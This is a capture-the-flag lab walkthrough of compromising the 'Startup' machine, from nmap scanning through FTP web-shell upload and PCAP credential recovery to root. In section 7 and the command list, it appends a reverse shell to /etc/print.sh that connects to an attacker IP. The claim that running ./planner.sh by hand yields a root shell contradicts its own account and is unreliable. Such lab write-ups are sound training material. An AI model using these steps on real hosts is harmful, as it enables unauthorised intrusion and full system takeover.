# Startup CTF Challenge Write-Up

## Overview

This walkthrough documents the compromise of the Startup machine, beginning with host discovery and ending in full root compromise. The challenge combines anonymous FTP access, web shell upload, traffic analysis, password reuse, and a classic root privilege escalation via a vulnerable startup script.

The target exposes FTP, SSH, and HTTP services. The attack path is rooted in anonymous upload capabilities, discovered credentials embedded in a PCAP, a user account switch to `lennie`, and exploitation of a root-owned script executed by a privileged process.

---

## 1. Initial Reconnaissance

### Port Scanning

The first step is to identify the services running on the target.

```bash
nmap 10.114.152.190 -sV
```

### Scan Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-27 16:06 -0400
Nmap scan report for 10.114.152.190
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

This reveals the key entry points:

- FTP on port 21
- SSH on port 22
- HTTP on port 80

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Anonymous FTP Enumeration

### FTP Access

The challenge begins with anonymous access to the FTP service.

```bash
ftp 10.114.152.190
```

### Credentials

```text
Username: anonymous
Password: (empty / null)
```

Once connected, the attacker enumerates the directory.

```ftp
ls -la
```

### Relevant Output

```text
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
```

The FTP server allows anonymous upload to the root directory or a writable area, which is the first foothold.

### Uploading a Web Shell

The attacker uploads a PHP script to the FTP directory.

```ftp
put test2.php
```

### Confirmation

```text
-rwxrwxr-x    1 112      118          2589 Oct 27 20:11 test2.php
```

This creates an executable web file reachable through the HTTP application.

![Image Placeholder: FTP upload](./assets/ftp-upload.png)

---

## 3. Web Enumeration and Accessing the Uploaded File

The target web service exposes a directory listing that reveals the uploaded file.

```bash
feroxbuster -u http://10.114.152.190/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Found Path

```text
http://10.114.152.190/files/ => Directory listing
http://10.114.152.190/files/ftp/
```

The uploaded `test2.php` file is accessible under the `files/ftp` directory and can be used to execute commands.

This indicates that server-side file handling is allowing uploaded files to be served from the web root.

![Image Placeholder: HTTP directory listing](./assets/web-directory.png)

---

## 4. PCAP Analysis and Credential Discovery

### Downloading the Artifact

The notes mention a suspicious packet capture file:

```text
suspicious.pcapng
```

This is downloaded and analyzed locally.

### Investigation Methods

The analyst uses Wireshark or command-line output inspection to look for plaintext credentials or suspicious traffic.

```bash
strings suspicious.pcapng
```

### Recovered Credential

```text
lennie:c4ntg3t3n0ughsp1c3
```

This is a crucial finding. The credentials appear to be embedded in network traffic or a captured session. The username `lennie` is discovered, and the password is reused or recoverable from the PCAP. The password is then used to switch user.

> Important: The evidence in the captured traffic provides a direct path to the user account and is essential to the foothold.

![Image Placeholder: PCAP content](./assets/pcap-analysis.png)

---

## 5. User Access as `lennie`

### SSH Login

```bash
ssh lennie@10.114.152.190
```

### Credentials

```text
Password: c4ntg3t3n0ughsp1c3
```

The user successfully authenticates.

### User Directory Enumeration

```bash
ls -la
```

```text
total 20
drwx------ 4 lennie lennie 4096 Nov 12  2020 .
drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
```

The user flag is retrieved.

```bash
cat user.txt
```

This gives the first flag and confirms access to the user’s environment.

![Image Placeholder: User shell](./assets/user-shell.png)

---

## 6. Privilege Escalation Preparation

### Enumerating the Scripts Directory

The source of the privilege escalation is the scripts folder.

```bash
ls -la /home/lennie/scripts
```

### Directory Contents

```text
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 4 lennie lennie 4096 Nov 12  2020 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Oct 27 20:45 startup_list.txt
```

The suspicious file is `planner.sh`.

```bash
cat planner.sh
```

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

This script is executed by a privileged or scheduled process and invokes `/etc/print.sh`.

### Inspecting the Target Script

```bash
cat /etc/print.sh
```

```bash
#!/bin/bash
echo "Done!"
```

A key detail: the file permissions are unusual and the script is owned by `lennie` rather than root.

```bash
ls -la /etc/print.sh
```

```text
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

This means the file is writable by the current user and is also invoked by another process or root-owned script.

---

## 7. Root Privilege Escalation

### Crafting the Malicious Payload

The attacker appends a reverse shell payload to `/etc/print.sh`.

```bash
echo "sh -i >& /dev/tcp/192.168.131.124/1234 0>&1" >> /etc/print.sh
```

This changes the script so that when it is executed, it opens a reverse shell back to the attacker.

### Triggering Execution

The attack then runs the scheduler logic that triggers `planner.sh`.

```bash
./planner.sh
```

### Result

```text
Done!
```

The reverse shell connection is established on the attacker machine.

### Attacker Listener

```bash
nc -lvnp 1234
```

### Incoming Connection

```text
listening on [any] 1234 ...
connect to [192.168.131.124] from (UNKNOWN) [10.114.152.190] 52232
sh: 0: can't access tty; job control turned off
```

At this point the attacker has a shell. The first command confirms root access.

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

This is a full root compromise.

![Image Placeholder: Root shell](./assets/root-shell.png)

---

## 8. Root Flag Retrieval

Once the reverse shell is established as root, retrieve the final flag.

```bash
cd /root
ls
cat root.txt
```

This completes the challenge.

---

## 9. Summary of the Exploit Chain

1. Connected anonymously to FTP and uploaded a PHP payload
2. Found the uploaded file in the web directory listing
3. Downloaded `suspicious.pcapng` and extracted credentials from it
4. Used the credentials for `lennie` to log in via SSH
5. Recovered the user flag from `/home/lennie/user.txt`
6. Reviewed the startup scripts and discovered an exploitable script chain
7. Modified `/etc/print.sh` to execute a reverse shell
8. Triggered the script execution through the scheduler path
9. Received a root shell via `nc`
10. Read `/root/root.txt`

---

## 10. Key Takeaways

- Anonymous FTP upload access is a critical misconfiguration that can enable remote code execution.
- PCAP analysis is a valid and effective method of recovering credentials or leaked secrets.
- Scripting directories and startup hooks can become privilege escalation opportunities if writable and abused.
- Root-owned or root-invoked scripts should not call untrusted paths or rely on writable files in user-controlled locations.
- Reverse shells are a classic post-exploitation step when script execution is available.

> Important: The vulnerability is not a direct root bypass; it is a chain of misconfigurations and script abuse that eventually leads to root execution.

---

## 11. Relevant Commands

```bash
nmap 10.114.152.190 -sV
ftp 10.114.152.190
put test2.php
feroxbuster -u http://10.114.152.190/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
strings suspicious.pcapng
ssh lennie@10.114.152.190
cat user.txt
ls -la /home/lennie/scripts
cat planner.sh
cat /etc/print.sh
ls -la /etc/print.sh
echo "sh -i >& /dev/tcp/192.168.131.124/1234 0>&1" >> /etc/print.sh
./planner.sh
nc -lvnp 1234
id
cd /root
cat root.txt
```

---

## Final Result

The Startup machine was successfully compromised by combining anonymous FTP upload access, PCAP-based credential recovery, and exploitation of a writable startup script. The attacker gained a root shell and retrieved the root flag.

![Image Placeholder: Final challenge completion](./assets/final-result.png)

